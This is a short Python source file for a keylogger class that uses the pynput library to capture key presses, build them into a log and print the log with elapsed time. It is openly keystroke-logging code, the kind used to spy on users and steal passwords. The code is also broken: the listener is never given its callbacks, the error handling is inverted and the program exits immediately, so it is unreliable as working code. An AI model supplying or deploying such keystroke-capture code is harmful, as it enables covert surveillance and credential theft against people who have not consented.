import pynput
import time

class KeyLogger:
    def __init__(self):
        self.log = ""
        self.key_listener = pynput.keyboard.Listener()
        self.start_time = time.time()

    def record_key(self, key):
        self.log += str(key) + " "

    def on_press(self, key):
        try:
            self.record_key(key)
        except AttributeError:
            self.record_key(key.char)

    def on_release(self, key):
        if key == pynput.keyboard.Key.esc:
            self.stop()

    def start(self):
        self.key_listener.start()
        self.start_time = time.time()

    def stop(self):
        self.key_listener.stop()
        self.log += "End Time: " + str(time.time() - self.start_time) + "\n"
        print(self.log)

if __name__ == "__main__":
    keylogger = KeyLogger()
    keylogger.start()
```

